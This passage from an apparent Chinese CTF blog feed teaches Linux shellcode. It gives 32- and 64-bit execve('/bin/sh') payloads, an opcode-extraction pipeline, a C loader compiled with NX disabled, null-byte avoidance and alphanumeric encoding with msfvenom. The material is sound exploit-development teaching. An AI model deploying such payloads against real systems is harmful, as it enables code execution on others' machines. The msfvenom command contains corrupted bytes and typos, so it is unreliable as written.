tiny_execve_sh.asm</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_i386 tiny_execve_sh.o -o tiny_execve_sh</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./tiny_execve_sh</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">objdump -d tiny_execve_sh           \                                               127 ⨯</span></span><br><span class="line"></span><br><span class="line">tiny_execve_sh：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line">08049000 &lt;_start&gt;:</span><br><span class="line"> 8049000:       31 c9                   xor    %ecx,%ecx</span><br><span class="line"> 8049002:       f7 e1                   mul    %ecx</span><br><span class="line"> 8049004:       b0 0b                   mov    $0xb,%al</span><br><span class="line"> 8049006:       51                      push   %ecx</span><br><span class="line"> 8049007:       68 2f 2f 73 68          push   $0x68732f2f</span><br><span class="line"> 804900c:       68 2f 62 69 6e          push   $0x6e69622f</span><br><span class="line"> 8049011:       89 e3                   mov    %esp,%ebx</span><br><span class="line"> 8049013:       cd 80                   int    $0x80</span><br></pre></td></tr></table></figure><p>为了在 C 程序中使用这段 shellcode，我们需将其 <mark>opcode 提取</mark>出来（我这里 cut:无效的字段范围）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">objdump -d ./tiny_execve_sh|grep <span class="string">&#x27;[0-9a-f]:&#x27;</span>|grep -v <span class="string">&#x27;file&#x27;</span>|<span class="built_in">cut</span> -f2 -d:|<span class="built_in">cut</span> -f1-6 -d<span class="string">&#x27; &#x27;</span>|<span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span>|<span class="built_in">tr</span> <span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27; &#x27;</span>|sed <span class="string">&#x27;s/ $//g&#x27;</span>|sed <span class="string">&#x27;s/ /\\x/g&#x27;</span>|<span class="built_in">paste</span> -d <span class="string">&#x27;&#x27;</span> -s |sed <span class="string">&#x27;s/^/&quot;/&#x27;</span>|sed <span class="string">&#x27;s/$/&quot;/g&#x27;</span></span></span><br><span class="line">&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br></pre></td></tr></table></figure><p>将提取出来的字符放到 C 程序的 shellcode[] 中。需要注意的是，shellcode 作为全局初始化变量，存放在 .data 段中，而编译时默认开启的 NX 保护机制，会将数据所在的内存页标识为不可执行，当程序转入 shellcode 执行时抛出异常。因此，下面需要关闭 NX。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc -m32 -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./tiny_execve_sh_shellcode</span></span><br></pre></td></tr></table></figure><p>Linux 64 位的 shellcode 也一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)</span><br><span class="line">;&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">xorrdx, rdx</span><br><span class="line">movqword rbx, &#x27;//bin/sh&#x27;; 0x68732f6e69622f2f</span><br><span class="line">shrrbx, 0x8</span><br><span class="line">pushrbx</span><br><span class="line">movrdi, rsp</span><br><span class="line">pushrax</span><br><span class="line">pushrdi</span><br><span class="line">movrsi, rsp</span><br><span class="line">moval, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf64 tiny_execve_sh64.asm</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_x86_64 tiny_execve_sh64.o -o tiny_execve_sh64</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./tiny_execve_sh64</span> </span><br></pre></td></tr></table></figure><h1 id="4-shellcode-变形"><a class="markdownIt-Anchor" href="#4-shellcode-变形"></a> 4. shellcode 变形</h1><p>有时，被注入进程的 shellcode 会被限制使用某些字符，例如不能有 NULL、只能用字母和数字等可见字符、ASCII 和 Unicode 编码转换等，因此需要进行一些处理。</p><p>由于 NULL 会将字符串操作函数截断，所以我们需要用其它相似功能的指令来替代，下面是一个 32 位指令替换的例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">替换前：</span><br><span class="line">B8 01000000 MOVEAX,1</span><br><span class="line"></span><br><span class="line">替换后：</span><br><span class="line">33C0XOR EAX,EAX</span><br><span class="line">40INC EAX</span><br></pre></td></tr></table></figure><p>对于只能使用可见字符字母（也就是只能用字母和数字组合）的情况，将 shellcode 的字符进行编码，使其符合限制条件。相应地，需要在 shellcode 中加入解码器，在代码行前将原始 shellcode 还原出来。</p><p>著名的渗透测试框架 Metasploit 中就集成了许多 shellcode 的编码器，这里我们选择 x86/alpha_mixed 来编码 32 位的 shellcode。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">msfvenom -1 encoders | grep -i alphanumeric</span></span><br><span class="line">x86/alpha_mixed lowAlpha2 Alphanumeric Mixedcase Encoder</span><br><span class="line">x86/alpha_upperlowAlpha2 Alphanumeric Uppercase Encoder</span><br><span class="line">x86/unicode_mixedmanual Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class="line">x86/unicode uDpermanual Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">python -c <span class="string">&#x27;import sys; sys.stdout.write(&quot;\x31\xc9\xf7\xel\xb0\x0b\x51\</span></span></span><br><span class="line"><span class="string"><span class="language-bash">x68\:&lt;2f\x2f\xT?3\x68\x68\x2f\x62\x69\x6e\x89\xo3\xcd\x80&quot;)&#x27;</span> | msfveno -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufterRegister=EAX</span> </span><br><span class="line">Attempting to encode payload with 1 iterations of x86/alpha_mixed </span><br><span class="line">x86/alpha_mixed succeeded with size 96 (iteration=0)</span><br><span class="line">x86/alpha mixed chosen with final size 96</span><br><span class="line">Payload size: 96 bytes</span><br><span class="line">PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI01o9igHah04Ksa3XTodot31</span><br><span class="line">xBHtorBcYpnniis8MOpAA</span><br></pre></td></tr></table></figure><blockquote><p>参考：</p><p>​<a href="https://www.cnblogs.com/lsgxeva/p/10794331.html">Linux下shellcode的编写</a></p><p>​<a href="https://zhuanlan.zhihu.com/p/212610634">带你玩转 Linux Shellcode</a></p><p>​<a href="https://www.freebuf.com/articles/system/237300.html">简述获取shellcode的几种方式</a></p><p>​<a href="https://cloud.tencent.com/developer/article/1930058?from=article.detail.1799682">Linux下Shellcode编写</a></p><p>​<a href="https://filippo.io/linux-syscall-table/">Linux Syscall Table</a></p><p>​《CTF竞赛权威指南》</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;1-什么是-shellcode&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-什么是-shellcode&quot;&gt;&lt;/a&gt; 1. 什么是 shellcode ？&lt;/h1&gt;
&lt;p&gt;shellcode 通常用机器语言</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="shellcode" scheme="https://www.rgzzplus.com/tags/shellcode/"/>
    
  </entry>
  
</feed>
